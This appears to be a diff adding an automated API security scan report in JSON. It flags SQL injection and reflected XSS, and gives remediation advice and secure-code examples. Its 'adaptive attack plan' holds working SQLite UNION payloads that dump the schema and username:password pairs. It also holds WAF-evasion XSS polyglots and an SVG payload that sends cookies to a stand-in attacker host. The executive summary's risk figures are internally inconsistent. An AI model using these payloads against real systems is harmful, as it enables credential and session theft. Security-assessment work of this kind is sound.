@@ -1,0 +1,102 @@
+{
+  "overall_risk_score": 33.9,
+  "threat_level": "MEDIUM",
+  "cvss_base_score": 7.8,
+  "total_findings": 2,
+  "severity_breakdown": {
+    "Critical": 0,
+    "High": 2,
+    "Medium": 0,
+    "Low": 0
+  },
+  "enriched_findings": [
+    {
+      "id": "VULN-001",
+      "vulnerability_type": "SQL Injection",
+      "original_severity": "Critical",
+      "ml_predicted_severity": "High",
+      "endpoint": "/api/users/search",
+      "method": "GET",
+      "parameter": "query",
+      "payload_used": "' OR '1'='1",
+      "confidence": 0.98,
+      "factors": {
+        "endpoint_sensitivity_score": 4,
+        "data_exposure_score": 1,
+        "auth_requirement_factor": 0
+      },
+      "explanation": {
+        "finding_id": "VULN-001",
+        "vulnerability_type": "SQL Injection",
+        "severity": "High",
+        "endpoint": "GET /api/users/search",
+        "cwe_reference": "CWE-89 (Improper Neutralization of Special Elements used in an SQL Command)",
+        "owasp_category": "OWASP API8:2023 Security Misconfiguration / Injection",
+        "technical_description": "The API endpoint directly incorporates untrusted user input into a dynamic SQL query without parameterization or escaping.",
+        "attack_impact": "An attacker can bypass authentication, extract confidential database records (PII, passwords), modify or delete tables, and potentially execute system commands.",
+        "remediation_guidance": "Use parameterized queries or Object Relational Mapping (ORM) with prepared statements. Never concatenate user input into SQL strings.",
+        "secure_code_example": "# INSECURE:\nquery = f\"SELECT * FROM users WHERE name = '{user_input}'\"\n\n# SECURE (Parameterized Query):\ncursor.execute(\"SELECT * FROM users WHERE name = %s\", (user_input,))"
+      }
+    },
+    {
+      "id": "VULN-002",
+      "vulnerability_type": "Reflected Cross-Site Scripting (XSS)",
+      "original_severity": "High",
+      "ml_predicted_severity": "High",
+      "endpoint": "/api/comments",
+      "method": "POST",
+      "parameter": "comment",
+      "payload_used": "<script>alert('XSS')</script>",
+      "confidence": 0.95,
+      "factors": {
+        "endpoint_sensitivity_score": 3,
+        "data_exposure_score": 1,
+        "auth_requirement_factor": 0
+      },
+      "explanation": {
+        "finding_id": "VULN-002",
+        "vulnerability_type": "Reflected Cross-Site Scripting (XSS)",
+        "severity": "High",
+        "endpoint": "POST /api/comments",
+        "cwe_reference": "CWE-79 (Improper Neutralization of Input During Web Page Generation)",
+        "owasp_category": "OWASP API8:2023 Security Misconfiguration",
+        "technical_description": "User-supplied data is echoed back in the API response without contextual output encoding or sanitization.",
+        "attack_impact": "If consumed by a browser frontend, malicious JavaScript can execute in the victim's session, stealing cookies, session tokens, or performing unauthorized actions on their behalf.",
+        "remediation_guidance": "Apply contextual output encoding (HTML, JavaScript, URL encoding). Enforce strict Content-Security-Policy (CSP) headers.",
+        "secure_code_example": "# INSECURE:\nreturn f\"<div>Comment: {comment}</div>\"\n\n# SECURE (HTML Escaping):\nimport html\nsafe_comment = html.escape(comment)\nreturn f\"<div>Comment: {safe_comment}</div>\""
+      }
+    }
+  ],
+  "adaptive_attack_plan": {
+    "total_adaptive_plans": 2,
+    "adaptive_attack_plans": [
+      {
+        "endpoint": "/api/users/search",
+        "method": "GET",
+        "attack_phase": "Secondary Adaptive Exploitation",
+        "target_db": "SQLite 3",
+        "strategy": "Schema Extraction & Data Exfiltration",
+        "adaptive_payloads": [
+          "' UNION SELECT 1, sqlite_version(), 3--",
+          "' UNION SELECT 1, sql, 3 FROM sqlite_master WHERE type='table'--",
+          "' UNION SELECT 1, username || ':' || password, 3 FROM users--"
+        ],
+        "rationale": "SQLite error signature confirmed; switching from generic fuzzing to SQLite schema extraction payloads."
+      },
+      {
+        "endpoint": "/api/comments",
+        "method": "POST",
+        "attack_phase": "Filter Evasion & Context Escape",
+        "target_db": "N/A",
+        "strategy": "WAF Bypassing & Polyglot Injection",
+        "adaptive_payloads": [
+          "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert(1) )//",
+          "<svg/onload=fetch('http://attacker.local/?c='+document.cookie)>",
+          "<details/open/ontoggle=alert(1)>"
+        ],
+        "rationale": "Reflected parameter detected; applying WAF-evasive SVG event handlers and cookie exfiltration payloads."
+      }
+    ]
+  },
+  "executive_summary": "EXECUTIVE SECURITY ASSESSMENT SUMMARY:\n- Overall System Risk Score: 33.9/100 (MEDIUM)\n- Estimated CVSS Base Score: 7.8/10.0\n- Total Detected Vulnerabilities: 2\n  * Critical: 0\n  * High:     2\n  * Medium:   0\n  * Low:      0\n\nKey Takeaway: The target API exhibits 0 critical vulnerabilities that require immediate mitigation before production release."
+}
